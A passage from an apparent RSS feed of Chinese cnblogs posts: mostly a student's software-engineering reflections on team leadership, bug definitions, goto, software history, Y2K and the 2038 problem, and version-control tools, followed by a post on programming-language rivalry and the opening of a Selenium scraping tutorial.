&lt;p&gt;笔者带过的一个团队，当时就这么干的。期初几次，笔者一个人单挑的成效都很不错。越到后来，就发现大家都开始起不到作用。笔者甚至一度很生气，去质问过他们，甚至逼过他们。可是最终，笔者得出了一个令人绝望的答案——&lt;strong&gt;他们真的啥也不会了&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;或者换句话说，&lt;strong&gt;在该锻炼队伍成员，该磨合团队协作模式的时候，这些事情一样都没有做&lt;/strong&gt;。最终，这个所谓被称之为团队的东西，完全成了由一个强力单体，和若干起不到任何作用的人，构成的乌合之众。&lt;strong&gt;对于强力单体，看似有团队，实则孤立无援，最终迟早被硬生生累垮&lt;/strong&gt;。&lt;strong&gt;对于其他人，看似有团队，实则毫无归属感，自然不可能愿意卖力，就算愿意，也并不能真正的帮上忙&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;这还不算完，&lt;strong&gt;如果有一天，这个团队的强力单体出现了状况的话，那么，这个所谓的团队，会立刻面临灭顶之灾，且毫无自保的能力&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;这样的故事其实历史上已经上演过无数次：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;诸葛亮鞠躬尽瘁，死而后已。他在的时候，把三国中最弱的蜀国治理的井井有条。然而他事必躬亲，于是导致的局面就是，其他不如他的人才完全没有成长的空间。等他一死，蜀国一下子就出现了严重的人才断层。很快，蜀国就灭亡了。&lt;/li&gt;
&lt;li&gt;月厨们都知道，Saber生前的经历。甘愿当圣人，想要一己之力拯救臣民。然而等有一天光辉不再的时候，就注定要面临生命中的卡姆兰之丘。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;所以，个人认为。&lt;strong&gt;就算PM，或者说领导，有着极强的个人输出能力，也绝对不可以随随便便就亲自上阵&lt;/strong&gt;（当然，偶尔救急可以，但是绝不可以成为常态）。&lt;strong&gt;不是因为什么领导的架子，而是出于整个团队的可持续发展考虑&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;不过，&lt;strong&gt;这里面具体的分寸，也确实是一个值得深思的问题&lt;/strong&gt;。从一碗鸡汤爬出来，立马跳进另一碗鸡汤，也不是正确的思考问题方式。笔者也认为，自己目前这块实际上做得还远远不够成熟。&lt;/p&gt;
&lt;h3 id=&quot;思考二bug的定义&quot;&gt;思考二：Bug的定义&lt;/h3&gt;
&lt;p&gt;问题源自&lt;a href=&quot;https://www.cnblogs.com/buaaguzhanpeng/p/10466836.html&quot;&gt;guzhanpeng同学的博客&lt;/a&gt;。第一个疑问，里面说到了bug的定义问题。&lt;/p&gt;
&lt;p&gt;首先我想说的是，Bug本身就不是一种单一的定义。&lt;/p&gt;
&lt;p&gt;这位同学百度搜索到的结果是：&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;程序错误（英语：Bug），是程序设计中的术语，是指在软件运行中因为程序本身有错误而造成的功能不正常、死机、数据丢失、非正常中断等现象&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个当然没有错，这个是程序设计意义上的bug。&lt;/p&gt;
&lt;p&gt;然而，实际上从用户、从需求的角度来说，不符合需求的，就是bug。这个bug是产品需求意义上的bug。&lt;strong&gt;这两者并不存在矛盾抑或是冲突&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;或者也可以说，&lt;strong&gt;bug可以一般性定义为和期望不符的状态及其诱因&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;对于程序而言，结果错误、运行时错误、崩溃，这确实就是和期望的正确结果不符的状态。&lt;/li&gt;
&lt;li&gt;对于产品而言，你程序就算对了，但是人家要个苹果你给人家运来一车梨，还美其名曰梨很好吃我们也很辛苦，这显然就是在扯淡了。没错，这也是与期望状态不符的状态。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;综上，其实&lt;strong&gt;所谓bug的两种定义（当然，也可能有更多的层面），本质还是统一的，只是站在了不同的需求立场上而已&lt;/strong&gt;。前者是程序层面的正确，后者是产品层面的更优。&lt;strong&gt;根本上，BUG与否，还是取决于想要的是什么&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;思考三领头羊是否必要&quot;&gt;思考三：领头羊是否必要&lt;/h3&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;17.1 “领导力”中，强调了团队领导的重要性。联想到即将开始的团队编程，领导该如何确定？很可能出现两种情况：一种是团队里有个大牛，由于他的技术最好，大家都听他的。另一种是大家互相讨论，少数服从多数，实际上没有一个真正的领导。实际上，由于大家都是技术人员，对项目方向上的把控水平可能都差不多，所以我认为没有领导的小团队，应该也是可以的吧？&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个是来自于&lt;a href=&quot;https://www.cnblogs.com/bvb1909/p/10457115.html#4191845&quot;&gt;Jason同学的问题&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;先说结论，&lt;strong&gt;要，而且非常重要&lt;/strong&gt;。然后，请听我慢慢分析。&lt;/p&gt;
&lt;p&gt;这位同学的观点中，有这么一句&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;团队里有个大牛，由于他的技术最好，大家都听他的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;这句话本身也是错的&lt;/strong&gt;。错的原因，思考一中已经有了详细的说明。即便在决策层面，要是决策权完全捆绑在了一个emperor的头上，那么这就像极了封建专制制度（没有褒义或者贬义）——一人独裁。&lt;/p&gt;
&lt;p&gt;一人独裁的好处是很明显的，显然这位同学也明白这个好处——只要这个leader足够的靠谱。但是一人独裁的坏处，其实和好处一样的明显——&lt;strong&gt;只要这个leader不够靠谱，团队的结局就注定只有灭亡&lt;/strong&gt;。中国历朝历代无数的开国之君，和亡国之君，他们都已经用他们一生的经历，向后人证明了这件事。&lt;/p&gt;
&lt;p&gt;那么既然不应该一人独裁，那么，就应该绝对的民主么？答案是否定的。&lt;/p&gt;
&lt;p&gt;反面教材，其实也很好找——现在的很多欧美国家，也就是很多人口中“皿煮”的圣地，就会存在这样的问题。是的没错，他们的三权分立、议会制，确实在权利的制约平衡上做的相当不错。&lt;/p&gt;
&lt;p&gt;然而这样也带来了新的问题。俗话说得好——屁股决定脑袋。各方的立场与利益不太可能总是一致，既然不一致，那么在这样的体制下，不同势力之间的&lt;strong&gt;通力协作将变得几乎不可能&lt;/strong&gt;，反而完全变成了权力的博弈战，&lt;strong&gt;内耗极其严重&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;在人的团队中，虽然没那么复杂，但是大致道理也是类似的——&lt;strong&gt;如果一个团队，没有一个明确的领头羊的话，那么这个团队的秩序将是很大的问题&lt;/strong&gt;。而秩序，则对于达到团队最优解而言，是至关重要的。简而言之，如果一个团队里面，仅仅是因为所有人水平都差不多就所有人地位绝对一致的话，那么带来的后果就是团队工作的协调和调度上将会变得极为困难，甚至出现&lt;strong&gt;集体负责，等于集体不负责&lt;/strong&gt;的情况。遇了事情，意见不一，始终没人拍个板，也是一件非常麻烦的事。&lt;/p&gt;
&lt;p&gt;就笔者本身而言，笔者也曾在整体实力较强的团队里面待过（在那个团队里面，几乎所有人都有和笔者差不多少的实力），然而那个团队依然是有个leader的存在，统筹规划着整个团队的事务进展，一板一眼调配着资源。其他人也都参与决策，各抒己见，但是犹豫不决之时，一定是leader拍板。&lt;/p&gt;
&lt;p&gt;综上，我的结论是，&lt;strong&gt;领头羊是必要的，但是也不可以搞成整个团队只有唯一的领头羊参与决策&lt;/strong&gt;。&lt;strong&gt;民主是必要的，但是过度的民主还不如专制来的靠谱&lt;/strong&gt;。&lt;/p&gt;
&lt;h3 id=&quot;思考四编程之法&quot;&gt;思考四：编程之法&lt;/h3&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;只要有助于程序逻辑的清晰体现，什么方法都可以使用，包括goto。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这话，在现在看起来是个政治不太正确的话，尤其是在这个已经广泛推荐使用结构化程序设计的年代，这听上去似乎确实像是历史的倒退。&lt;/p&gt;
&lt;p&gt;然而，&lt;strong&gt;这句话的本质确实对的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;看到有些同学认为这话不对，其实我觉得，他们只是&lt;strong&gt;没有理清楚因和果的关系&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;首先，在软件开发的蛮荒时代，先辈们之所以提出了结构化程序设计，原因就是，不结构化的话，程序质量将变得难以保证，工程项目也将难以维护。于是指定了一个标准，供后人参考。&lt;/p&gt;
&lt;p&gt;然而，不要忘了，&lt;strong&gt;这个标准的意义在于，让软件质量变得更好&lt;/strong&gt;。而不应该是反过来的。&lt;/p&gt;
&lt;p&gt;早在先秦，商鞅便说过&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;治世不一道，便国不法古。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;任何的法度，任何的规则，其根本目的都只有一个——追求最优地解决问题&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;而如果死搬教条，却反而忽视了问题的本质，走的太远忘了为啥而出发的话，那就是买椟还珠的笑话了。&lt;/p&gt;
&lt;h3 id=&quot;思考五猪鸡和鹦鹉的故事&quot;&gt;思考五：猪、鸡和鹦鹉的故事&lt;/h3&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;&lt;strong&gt;加入一个团队时，要弄清楚自己在团队中投入的级别是什么，别人的期望值是什么。不要拿着卖白菜的钱，操那卖白粉的心——太不值得。&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这句话，其实是大实话，也是笔者认为很多同龄人始终没想明白的一件事。&lt;/p&gt;
&lt;p&gt;实际上某种程度，团队成员和团队的关系，与软件产品和甲方的关系，还是颇为类似的——前者是卖家，后者是买家。&lt;strong&gt;前者买卖的是生产力（以及潜在的价值），后者买卖的是产品本身&lt;/strong&gt;。本质上，都不过是供求关系而已。&lt;/p&gt;
&lt;p&gt;正如上文中关于bug的论述&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;人家要一个苹果，你给人家拉来一车梨，纵使你说这梨子如何如何好吃我们如何如何辛苦，可是你就是没给人家需要的东西，那就是扯淡。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;没错，&lt;strong&gt;如果你提供的东西，其实并不是人家所需要的，那么你对于人家而言的价值就是零。如果你甚至还认为自己劳苦功高，认为人家有义务把你当大爷一样的供着，那就不仅是没价值，还会惹人生厌了。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这些话，看上去很政治不正确。实际上，每一个真正当过技术团队的leader，办过实事，招过兵买过马的leader，都会明白这句话的含义。（&lt;del&gt;笔者曾经招过一些“学霸”进自己的小团队，然而后来发现这人考试能力是不差，可是给团队几乎带不来什么效益，甚至可以说干啥啥不行。不仅如此，还自视甚高，认为是我们团队对不起他。这样的人，用上面的话说，他们对于应试教育而言，是完美的。但是他们对于技术团队而言，那就是有BUG的。&lt;/del&gt;）&lt;/p&gt;
&lt;p&gt;其实这些车轱辘话说来说去，&lt;strong&gt;根本矛盾还是供求关系&lt;/strong&gt;。笔者认为，这个问题也是软件工程，甚至是整个产业界，的根本问题之一。&lt;/p&gt;
&lt;p&gt;显然，从团队成员角度，确实是应该好好掂量对方对自己的期望的：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;如果对方对你期望很高，你却实际上根本不可能办到，那么即便人家给你开价再高，你也最好走为上策，&lt;strong&gt;这是做人最基本的素质&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;如果对方对你期望很低，而你实际上可以创造比这个高的价值的话，那么笔者认为：
&lt;ul&gt;&lt;li&gt;你可以想办法&lt;strong&gt;让leader（或者甲方）认同你的价值，然后一起创造更大的价值&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;如果上一条行不通，那么根据笔者的经验，你*&lt;strong&gt;给他们想要的就好了&lt;/strong&gt;（笔者之前就遇到过难以沟通的需求甲方）&lt;/li&gt;
&lt;li&gt;当然，如果实在不爽的话，也可以选择跳槽。&lt;strong&gt;既然没机会兼济天下，那么独善其身也可以作为次级的选择&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;从团队的角度，那么该做的是这样的：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;尽力去观察团队成员，和他们多沟通，了解他们切实的需求，然后，&lt;strong&gt;尽量给他们想要的&lt;/strong&gt;（这很重要，&lt;strong&gt;供求关系，实际上也应该是双方面的，各取所需的合作关系才有稳定的可能&lt;/strong&gt;）&lt;/li&gt;
&lt;li&gt;如果沟通了，发现这样的人真的没有价值的话（当然也可能只是对我们团队没用），那么也&lt;strong&gt;没必要强留，看着办即可&lt;/strong&gt;（当然，条件允许的话也可以先留着，毕竟多条人脉总有用得着的时候）&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;以上，就是笔者对团队内供求关系的理解。&lt;/p&gt;
&lt;h2 id=&quot;软件的起源&quot;&gt;软件的起源&lt;/h2&gt;
&lt;ul&gt;&lt;li&gt;化学家和统计学家约翰·图基（John W. Tukey）在1958年撰写一篇科学文章时，首次使用“软件”这一术语。据报道，他早在1953年就已经提出这个词，用来标记计算机程序（即“软件）与使用这些程序的计算机（或“硬件”）之间的区别。&lt;strong&gt;软件的概念被提出&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;软件工程的最初概念，是1968年Margaret Hamilton在阿波罗计划期间提出来的。&lt;strong&gt;软件，开始和工程接轨&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;1968年NATO会议上首次提出“软件工程”（Software Engineering）的概念，提出把软件开发从“艺术”和“个体行为”向“工程”和“群体协同工作”转化。其基本思想是应用计算机科学理论和技术以及工程管理原则和方法，按照预算和进度，实现满用户要求的软件产品的定义、开发、发布和维护的工程。从此也诞生了一门新的学科——软件工程。&lt;strong&gt;软件工程这门学科算是正式诞生了&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;冷知识趣闻&quot;&gt;冷知识、趣闻&lt;/h2&gt;
&lt;h3 id=&quot;世界上第一个bug&quot;&gt;世界上第一个BUG&lt;/h3&gt;
&lt;p&gt;1945年9月，美国海军编程员、编译器的发明者格蕾斯·哈珀正带着他的小组构造一个叫“马克二型”的计算机。这个计算机使用了大量的继电器， 一种电子机械装置。虽然已进入9月，但天气依然炎热，房间里没有空调， 所有窗户都敞开散热。为了早日将“马克二型”构造完成，格蕾斯·哈珀带着小组成员夜以继日的工作。&lt;/p&gt;
&lt;p&gt;所谓好事多磨，在9月9日下午三点，电视剧情节般的意外如期而至。突然，“马克二型”死机了，而技术人员尝试了许多方法，最后才定位到第70号继电器出错。要知道，“马克二型”用了1万7千多个继电器。&lt;/p&gt;
&lt;p&gt;既然找到是70号继电器出错了，那么接下来的事情也就好办了。格蕾斯·哈珀仔细观察这个出错的继电器，然后发现一只被继电器打死了的飞蛾躺在中间。于是格蕾斯·哈珀小心的用镊子将飞蛾夹出来，用透明胶布将飞蛾贴到“事件记录本”中，并注明“第一个发现Bug的实例”。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/703546/201903/703546-20190304230251612-507905484.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;没错，世界上第一个BUG，还真就是一直虫子。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;千年虫问题与2038危机&quot;&gt;千年虫问题与2038危机&lt;/h3&gt;
&lt;p&gt;千年虫问题（摘自百度百科）：&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;计算机2000年问题，又叫做“千年虫”、“电脑千禧年千年虫问题”或“千年危机”。缩写为“Y2K”。是指在某些使用了计算机程序的智能系统（包括计算机系统、自动控制芯片等）中，由于其中的年份只使用两位十进制数来表示，因此当系统进行（或涉及到）跨世纪的日期处理运 算时（如多个日期之间的计算或比较等），就会出现错误的结果，进而引发各种各样的系统功 能紊乱甚至崩溃。因此从根本上说千年虫是一种程序处理日期上的bug（计算机程序故障），而非病毒。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;2038危机（摘自百度百科）：&lt;/p&gt;
&lt;blockquote readability=&quot;30.714022140221&quot;&gt;
&lt;p&gt;也许大家都已经知道计算机的2000年问题是什么概念，但是什么时候又冒出来一个2038年问题的呢？&lt;/p&gt;
&lt;p&gt;用C语言编制的程序不会碰到2000年问题，但是会有2038年问题。这是因为，大多数C语言程序都使用到一个叫做“标准时间库”的&lt;a href=&quot;https://baike.baidu.com/item/%E7%A8%8B%E5%BA%8F%E5%BA%93&quot;&gt;程序库&lt;/a&gt;，这个时间库用一个标准的4字节也就是32位的形式来储存时间信息。&lt;/p&gt;
&lt;p&gt;当初设计的时候，这个4字节的时间格式把1970年1月1日凌晨0时0分0秒（这个时间名叫 the Unix Epoch）作为时间起点，这时的时间值为0。以后所有的时间都是从这个时间开始一秒一秒累积得来的。&lt;/p&gt;
&lt;p&gt;比方说如果时间已经累积到了919642718这个数值，就是说这时距离 the Unix Epoch已经过去了919642718秒，换算一下就应该是1999年2月21日16时18分38秒。&lt;/p&gt;
&lt;p&gt;这样计算时间的好处在于，把任意两个时间值相减之后，就可以很迅速地得到这两个时间之间相差的秒数，然后你可以利用别的程序把它换算成明白易懂的年月日时分秒的形式。&lt;/p&gt;
&lt;p&gt;要是你曾经读过一点儿关于计算机方面的书，你就会知道一个4&lt;a href=&quot;https://baike.baidu.com/item/%E5%AD%97%E8%8A%82&quot;&gt;字节&lt;/a&gt;也就是32位的存储空间的最大值是2147483647，请注意！2038年问题的关键也就在这里———当时间一秒一秒地跳完2147483647那惊心动魄的最后一秒后，你猜怎么样？&lt;/p&gt;
&lt;p&gt;答案是，它就会转为负数也就是说时间无效。那一刻的准确的时间为2038年1月19日星期二凌晨03:14:07，之后所有用到这种“标准时间库”的C语言程序都会碰到时间计算上的麻烦。&lt;/p&gt;
&lt;p&gt;这就是2038年问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其实，这类的问题还有很多：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;曾经，现代计算机之父冯诺依曼，表示在计算机上编写程序是没有意义的事情，应当花时间在硬件上。&lt;strong&gt;然后，软件时代就到来了&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;曾经，比尔盖茨表示，64KB内存足以应对世界上一切的程序需求。&lt;strong&gt;然后，2000年前后的内存都是上百MB的级别&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;曾经，人们认为，两位十进制数表示年份，肯定是够的。&lt;strong&gt;然后，2000年如期而至&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;曾经，人们也以为，timestamp弄个C语言的int32类型，就铁定够用了。&lt;strong&gt;然后，2038年也不远了&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;曾经，人们也认为，MD5是永久坚不可催的。&lt;strong&gt;然后，现在的MD5在存储海量数据的撞库面前根本不堪一击，用MD5加密的网站密码，已经属于可以轻松破解的类型了。&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;于是乎，在历史的进程下，之后人们还会面对哪些曾经呢？让我们拭目以待吧。&lt;/p&gt;
&lt;h2 id=&quot;项目管理软件&quot;&gt;项目管理软件&lt;/h2&gt;
&lt;table&gt;&lt;thead/&gt;&lt;tbody readability=&quot;12&quot;&gt;&lt;tr class=&quot;odd&quot; readability=&quot;5&quot;&gt;&lt;td&gt;git&lt;/td&gt;
&lt;td&gt;1、功能齐全&lt;br/&gt;2、支持各种复杂情况的代码管理&lt;br/&gt;3、与现代开发中的团队协作相性优秀&lt;br/&gt;4、主流版本控制，各大网站支持丰富&lt;/td&gt;
&lt;td&gt;1、原生git为纯命令行，对新手不算太友好&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;5&quot;&gt;&lt;td&gt;svn&lt;/td&gt;
&lt;td&gt;1、图形界面&lt;br/&gt;2、与windows相性良好&lt;/td&gt;
&lt;td&gt;1、图形界面（没错，这也是缺点）&lt;br/&gt;2、功能面不如git，没有git一样高的可玩性&lt;br/&gt;3、整体生态远远不如git&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;4&quot;&gt;&lt;td&gt;Github&lt;/td&gt;
&lt;td&gt;1、开源代码多，群众基础强大&lt;br/&gt;2、操作简单，即上即用&lt;/td&gt;
&lt;td&gt;1、（天朝限定）速度慢&lt;br/&gt;2、私有仓库是收费的&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;even&quot; readability=&quot;5&quot;&gt;&lt;td&gt;BitBucket&lt;/td&gt;
&lt;td&gt;1、私有仓库无限制&lt;br/&gt;2、功能丰富，专为团队开发设计&lt;/td&gt;
&lt;td&gt;1、（天朝限定）速度慢&lt;br/&gt;2、没有太多开源代码（至少远远比不上github）&lt;br/&gt;3、代码闭源&lt;/td&gt;
&lt;/tr&gt;&lt;tr class=&quot;odd&quot; readability=&quot;5&quot;&gt;&lt;td&gt;Gitlab&lt;/td&gt;
&lt;td&gt;1、代码开源，自行安装，自行配置&lt;br/&gt;2、完善的团队协作支持&lt;br/&gt;3、（天朝限定）速度快&lt;br/&gt;4、完美的ci支持&lt;/td&gt;
&lt;td&gt;1、私有的gitlab基本不存在开源代码&lt;br/&gt;2、免费版只提供部分功能&lt;/td&gt;
&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;</description>
<pubDate>Mon, 04 Mar 2019 15:05:00 +0000</pubDate>
<dc:creator>HansBug</dc:creator>
<og:description>概述 | 项目 | 内容 | | : : | : : | | 本次作业所属课程 | '2019BUAA软件工程 周二班' | | 本次作业要求 | '第1次个人作业' 当然，比这个更重要百倍的还是实实</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/HansBug/p/10473959.html</dc:identifier>
</item>
<item>
<title>开发语言大爆炸的时代，究竟谁主沉浮？ - 溪源More</title>
<link>http://www.cnblogs.com/xiyuanMore/p/10473944.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiyuanMore/p/10473944.html</guid>
<description>&lt;h2&gt;&lt;strong&gt;开发语言大爆炸的时代，究竟谁主沉浮？&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;　　&lt;span&gt;当这个系列本来打算是写人物的，而且是写我们身边那些优秀的开发者，然而当第一篇文章，写的是&lt;a href=&quot;https://www.cnblogs.com/xiyuanMore/p/10445986.html&quot; target=&quot;_blank&quot;&gt;关于我们长沙.NET社区的优秀开发者邹琼俊&lt;/a&gt;，发表在博客园之后，有一位也是昔日.NET 开发者、今天优秀的Java工程师给我留言，他说多年一来，一直紧跟着那些优秀的开发者，包括Learning Hard，王清培，还有陆敏技等等，都是C#领域的大牛，都出版过图书，并一度以他们为榜样，期待成为他们那样优秀的开发者。然而，后来这些优秀的开发者，哪怕他们出版了不少书籍，现在都不再以.NET 开发作为主要的语言方向，而是使用Java进行开发。（当然，他们转语言是几年前，那个时候还没.NetCore这个好东西。）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      我个人认为，那些能够出版书籍的优秀开发者，他们昔日是我们学习的榜样，他们今天依然是我们学习的榜样，他们的优秀，不仅仅是C#或.NET的骄傲，而是整个中国开发者团体的骄傲。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      在.NET体系语言的学习过程中，他们表现出来的才华，既成就了自己，也成就了他人。除此之外，通过.NET体系语言的学习，一通而百通，也让他们学习其他语言的过程更加的便捷。尤其是一开始接触的是C#这种设计优雅的语言，更是如此，C#的学习过程，让他们从C#开发者转到Java 开发者的过程中，往往并不需要花费太大的精力就可以轻松上手，游刃有余，下笔如有神。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      语言的转换与否，尤其是C#转java，更是司空见惯，老生长谈，仅仅一个语言之争，在今年年初就掀起了几波论战最终无疾而终。其实想起来，总觉得没什么意义。该做决策的人不会看这些文章，经济基础决定上层建筑，仅此而已。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;      当今时代，不仅仅是知识大爆炸的年代，也可以说是开发语言大爆发的时代。每一种开发语言体系，都并非是一个大而全、无懈可击的语言体系。优秀如C#，把VB 给革命了，优秀如Java 把C++给革命了，php自以为它把Java和C#革命了，然后Go 语言又出来了。当大家以为语言的发展方向基本上已经稳固的时候，Python和Nodejs 这两种经典而优秀的语言又逆势崛起，创造了一系列奇迹，紧接着还有Kotlin等一干毫不逊色的新兴语言翘首期盼。后端语言群雄逐鹿，移动端语言同样竞争激烈，java看起来一统安卓市场，却早就触及了甲骨文的逆鳞，当然谷歌公司早就给自己留了后路，像dart等语言就是为它准备的。除此之外，ng，react，vue等新三大开发框架也恨不能从大蛋糕中切去一大块，而他们似乎还取得了不错的进展。开发语言市场竞争是如此的激烈，毕竟关系到大几百万开发语言的拥趸们吃饭的家伙，市场大就饭好吃，市场小就吃冷饭。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_png/tWsuRibwLhGXa6RQ3Z5kNPeTjYEqbQN8NvSUuJdGAfjjk7oVua14fU1L6lKwE5ibicFzsDplPiaaqLCMuIQw8J9NZQ/640?wx_fmt=png&amp;amp;tp=webp&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&quot; alt=&quot;&quot; data-copyright=&quot;0&quot; data-ratio=&quot;1.0211267605633803&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_png/tWsuRibwLhGXa6RQ3Z5kNPeTjYEqbQN8NvSUuJdGAfjjk7oVua14fU1L6lKwE5ibicFzsDplPiaaqLCMuIQw8J9NZQ/640?wx_fmt=png&quot; data-type=&quot;png&quot; data-w=&quot;568&quot; data-fail=&quot;0&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;   然而，真的有独一无二的开发语言么？真的有什么语言能一统江湖，无所不能？不存在的，这辈子都不可能的，万万都不可能。唯一的判定标准，大概只有金钱这一种衡量条件而已。然而风水轮流转，今年到你家，明年到谁家？没人能预知未来的发展。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;     程序员们喜欢自嘲为码农，而这些优秀的语言，则正是我们的赖以为生的宝贵砖头。今天，那么多优秀的语言，打造出了许许多多优秀的基础设施，而如何灵活的运用的这些基础设施，为企业的快速发展提供了极大的便利，也带来了无穷挑战。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;   任何语言或技术都有他的精华和魅力所在，优秀的语言各有各的不同，但是又各有各的相似，坚持下去，持续几年的付出，还有什么学不会的？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;    尤其是.NET Core这种优秀的技术体系，更是如此，此刻的它，正是那含苞待放的鲜花，只要假以时日，必定芳香四溢，满园流芳，并令世人瞩目。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;     &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/tWsuRibwLhGXa6RQ3Z5kNPeTjYEqbQN8N4CzD94FgFsbEUMqcdcp7PaPuPjkLhAJXX4n9wLqe8Bz24D2jxbnMtg/640?wx_fmt=jpeg&amp;amp;tp=webp&amp;amp;wxfrom=5&amp;amp;wx_lazy=1&amp;amp;wx_co=1&quot; alt=&quot;&quot; data-copyright=&quot;0&quot; data-ratio=&quot;1&quot; data-s=&quot;300,640&quot; data-src=&quot;https://mmbiz.qpic.cn/mmbiz_jpg/tWsuRibwLhGXa6RQ3Z5kNPeTjYEqbQN8N4CzD94FgFsbEUMqcdcp7PaPuPjkLhAJXX4n9wLqe8Bz24D2jxbnMtg/640?wx_fmt=jpeg&quot; data-type=&quot;jpeg&quot; data-w=&quot;500&quot; data-fail=&quot;0&quot;/&gt;&lt;/p&gt;
&lt;p&gt;　　为了防止引起大家的不适，我把硬广写在评论里面了。。      &lt;/p&gt;
</description>
<pubDate>Mon, 04 Mar 2019 14:58:00 +0000</pubDate>
<dc:creator>溪源More</dc:creator>
<og:description>开发语言大爆炸的时代，究竟谁主沉浮？ 当这个系列本来打算是写人物的，而且是写我们身边那些优秀的开发者，然而当第一篇文章，写的是关于我们长沙.NET社区的优秀开发者邹琼俊，发表在博客园之后，有一位也是昔</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xiyuanMore/p/10473944.html</dc:identifier>
</item>
<item>
<title>爬虫之selenium模块 - W的一天</title>
<link>http://www.cnblogs.com/12345huangchun/p/10473812.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/12345huangchun/p/10473812.html</guid>
<description>&lt;h2&gt;　　一、selenium模块&lt;/h2&gt;
&lt;p&gt;　　之前，我们爬虫是模拟浏览器，但始终不是用的浏览器，但今天我们要说的是另一种爬虫方式，这次不是模拟浏览器，而是用程序去控制浏览器进行一些列操作，也就是selenium。selenium是python的一个第三方库，对外提供的接口可以操控浏览器，比如说输入、点击，跳转，下拉等动作。&lt;/p&gt;
